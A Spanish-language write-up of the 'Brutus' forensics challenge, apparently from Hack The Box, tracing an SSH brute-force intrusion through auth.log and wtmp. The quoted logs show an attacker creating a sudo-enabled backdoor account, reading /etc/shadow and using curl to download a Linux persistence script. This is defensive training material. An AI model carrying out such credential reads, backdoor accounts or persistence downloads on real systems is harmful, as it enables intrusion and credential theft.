
### Escenario de Sherlock

En este Sherlock muy sencillo, te familiarizarás con los registros auth.log y wtmp de Unix. Exploraremos un escenario en el que un servidor Confluence fue forzado brutalmente a través de su servicio SSH. Después de obtener acceso al servidor, el atacante realizó actividades adicionales, que podemos rastrear usando auth.log. Aunque auth.log se utiliza principalmente para análisis de fuerza bruta, profundizaremos en todo el potencial de este artefacto en nuestra investigación, incluidos aspectos de escalada de privilegios, persistencia e incluso cierta visibilidad en la ejecución de comandos.


---

Primero vamos a empezar descomprimiendo el archivo `brutus.zip`.

```bash
unzip brutus.zip

passwords: hacktheblue
```
Una vez el archivo se descomprime nos da  `auth.log`  `utmp.py`  `wtmp` ahora podemos continuar con los desafios.

---


#### Desafio 1

***Analizar el auth.log. ¿Cuál es la dirección IP utilizada por el atacante para realizar un ataque de fuerza bruta?****

podemos ver que la direccion `65.2.161.68` se repite constantemente

```bash
bat -l java auth.log | grep  '65.2.161.68' | wc -l 

214
```
Vemos que la direccion ip hizo 214 intentos de fuerza bruta contra el servidor 


usuarios a los que intento la fuerza bruta:

```bash
bat -l java auth.log | grep  '65.2.161.68' | awk -F' ' '{for(i=1;i<=NF;i++) if($i=="for") print $(i+1)}' | sort | uniq -c | sort -nr                                   2 ↵
     
     33 invalid
      9 backup
      8 root
      1 cyberjunki
```

vemos que intento con 33 usuario que no existen en la maquina , 9 intentos con el backup, 8 con el root y 1 con cyberjunki.

```bash
bat -l java auth.log | grep  '65.2.161.68' | head 

Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Invalid user admin from 65.2.161.68 port 46380
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Received disconnect from 65.2.161.68 port 46380:11: Bye Bye [preauth]
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Disconnected from invalid user admin 65.2.161.68 port 46380 [preauth]
Mar  6 06:31:31 ip-172-31-35-28 sshd[620]: drop connection #10 from [65.2.161.68]:46482 on [172.31.35.28]:22 past MaxStartups
Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: Invalid user admin from 65.2.161.68 port 46392
Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
Mar  6 06:31:31 ip-172-31-35-28 sshd[2332]: Invalid user admin from 65.2.161.68 port 46444
Mar  6 06:31:31 ip-172-31-35-28 sshd[2331]: Invalid user admin from 65.2.161.68 port 46436
Mar  6 06:31:31 ip-172-31-35-28 sshd[2332]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
Mar  6 06:31:31 ip-172-31-35-28 sshd[2331]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
```

En esta seccion vemos el inicio del ataque donde el atacante empezo con el usuario admin , como ven el servidor le regresa `invalid user` usuario invalido no existe.


```bash
bat -l java auth.log | grep  '65.2.161.68' | tail 

Mar  6 06:31:42 ip-172-31-35-28 sshd[2409]: Connection closed by authenticating user root 65.2.161.68 port 46890 [preauth]
Mar  6 06:31:42 ip-172-31-35-28 sshd[2409]: PAM 1 more authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68  user=root
Mar  6 06:31:42 ip-172-31-35-28 sshd[2423]: Failed password for backup from 65.2.161.68 port 34834 ssh2
Mar  6 06:31:42 ip-172-31-35-28 sshd[2424]: Failed password for backup from 65.2.161.68 port 34856 ssh2
Mar  6 06:31:44 ip-172-31-35-28 sshd[2423]: Connection closed by authenticating user backup 65.2.161.68 port 34834 [preauth]
Mar  6 06:31:44 ip-172-31-35-28 sshd[2424]: Connection closed by authenticating user backup 65.2.161.68 port 34856 [preauth]
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184
Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2
```
En esta seccion vemos el ultimo ataque de fuerza bruta donde el atacante logra entrar a el servidor por medio del usuario root se desconecta y luego se conecta a el usuario cyberjunkie que parece ser un usuario creado por el para persistencia

---

#### Desafio 2 

***Los intentos de fuerza bruta tuvieron éxito y el atacante obtuvo acceso a una cuenta en el servidor. ¿Cuál es el nombre de usuario de la cuenta?***

podemos ver que la cuenta que fue accedida por el atacante fue la cuenta con maximos privilegios en Linux `root`.

```bash
 322   │ Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
 323   │ Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
 324   │ Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
```

En esta seccion del log vemos como es acceptada la contrasena por el servidor y se abre una nueva session para el usuario root.


---
#### Desafio 3

***Identifique la marca de tiempo UTC cuando el atacante inició sesión manualmente en el servidor y estableció una sesión de terminal para llevar a cabo sus objetivos. El tiempo de inicio de sesión será diferente al tiempo de autenticación y se puede encontrar en el artefacto wtmp.****

Abrimos el binario wtmp.

```bash 
	cat wtmp
```

<img src="/budahacksecurity_static/uploads/md_images/brutus/brutus.png" style="max-width:100%; border-radius:8px;">

vemos que el binario se encuentra ofuscado utilizamos la herramienta que nos brindaron para desofuscar el binario `utmp.py`


```bash
	python3 utmp.py wtmp
```

<img src="/budahacksecurity_static/uploads/md_images/brutus/brutus1.png" style="max-width:100%; border-radius:8px;">

```bash
bat -l java wtmp.txt | grep 'root' | grep '65.2.161.68'
"USER"	"2549"	"pts/1"	"ts/1"	"root"	"65.2.161.68"	"0"	"0"	"0"	"2024/03/06 06:32:45"	"387923"	"65.2.161.68"
```

en el binario podemos ver que el usuario root inicio manualmente a las `2024/03/06 06:32:45` 

---

#### Desafio 4

***Las sesiones de inicio de sesión de SSH se rastrean y se les asigna un número de sesión al iniciar sesión. ¿Cuál es el número de sesión asignado a la sesión del atacante para la cuenta de usuario de la Pregunta 2?***

se le asigno la sesion `37` a el atacante

```bash
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
```


---

#### Desafio 5 

***El atacante agregó un nuevo usuario como parte de su estrategia de persistencia en el servidor y le dio a esta nueva cuenta de usuario privilegios más altos. ¿Cómo se llama esta cuenta?***

cyberjunkie

```bash

bat -l java auth.log  | grep 'cyberjunkie'
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/gshadow: name=cyberjunkie
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: new group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
Mar  6 06:34:26 ip-172-31-35-28 passwd[2603]: pam_unix(passwd:chauthtok): password changed for cyberjunkie
Mar  6 06:34:31 ip-172-31-35-28 chfn[2605]: changed user 'cyberjunkie' information
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2
Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: pam_unix(sshd:session): session opened for user cyberjunkie(uid=1002) by (uid=0)
Mar  6 06:37:34 ip-172-31-35-28 systemd-logind[411]: New session 49 of user cyberjunkie.
Mar  6 06:37:34 ip-172-31-35-28 systemd: pam_unix(systemd-user:session): session opened for user cyberjunkie(uid=1002) by (uid=0)
Mar  6 06:37:57 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
Mar  6 06:39:38 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
```

---

#### Desafio 6 

***¿Cuál es el ID de la subtécnica MITRE ATT&CK que se utiliza para la persistencia al crear una nueva cuenta?***

|   |   |
|---|---|
|[T1136.001](https://attack.mitre.org/techniques/T1136/001/)|[Cuenta local](https://attack.mitre.org/techniques/T1136/001/)|


<img src="/budahacksecurity_static/uploads/md_images/brutus/brutus2.png" style="max-width:100%; border-radius:8px;">


---


#### Desafio 7

***¿A qué hora finalizó la primera sesión SSH del atacante según auth.log?***

```bash
 │ Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184
 
 ```
Vemos que el atacante finalizo la primera session a las `06:37:24`.

---


#### Desafio 8 

***El atacante inició sesión en su cuenta de puerta trasera y utilizó sus privilegios más altos para descargar un script. ¿Cuál es el comando completo ejecutado usando sudo?***

```bash
 Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```


